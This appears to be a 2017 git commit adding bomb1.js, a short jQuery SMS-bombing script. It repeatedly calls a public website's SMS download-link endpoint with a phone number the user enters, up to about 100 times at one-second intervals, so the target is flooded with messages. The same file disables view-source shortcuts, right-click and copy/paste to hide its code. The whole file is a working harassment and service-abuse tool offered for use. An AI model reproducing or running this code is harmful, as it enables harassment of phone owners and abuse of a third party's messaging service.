f1857e5184d1cf617db641cab53aab0c02c24620
Utkarsh Tiwari <utiwari914@gmail.com>
2017-09-08 22:06:23 +0530

    Add files via upload

---
+++ bomb1.js
@@ -0,0 +1,52 @@
+shortcut.add("Ctrl+U",function() {
+		alert("BooBoo");
+});
+shortcut.add("F12",function() {
+		alert("BooBoo");
+});
+$(".btn").on('click', function() {
+	var number = $("#number").val();
+	var limitt = 100;
+	var url = 'http://www.narendramodi.in/site/senddnldlink?contact_no=91%C2%A0'+number;
+	var interval, i = 1;
+	var white_list = [
+	]
+
+
+	if( jQuery.inArray(number, white_list) == -1 ) {
+                interval = setInterval(bombb,1000);
+        }
+        else {
+                $("#resp").html("Number is in Protect List");
+                exit();
+        }
+   
+	
+	function bombb() {
+		$.ajax({
+		  url: url,
+		  type: 'GET',
+		  crossDomain: true,
+		  async: true,
+		  //dataType: "jsonp",
+		  success: function (response) {
+			console.log('Done');
+		  }
+		});
+		$("#resp").html(i+" SMS Sent");
+		if( i <= limitt ) i++;
+		else clearInterval(interval);
+	}    
+});
+
+$(document).ready(function () {
+    //Disable cut copy paste
+	$('body').bind('cut copy paste', function (e) {
+		e.preventDefault();
+	});
+
+	//Disable mouse right click
+	$("body").on("contextmenu",function(e){
+		return false;
+	});
+});
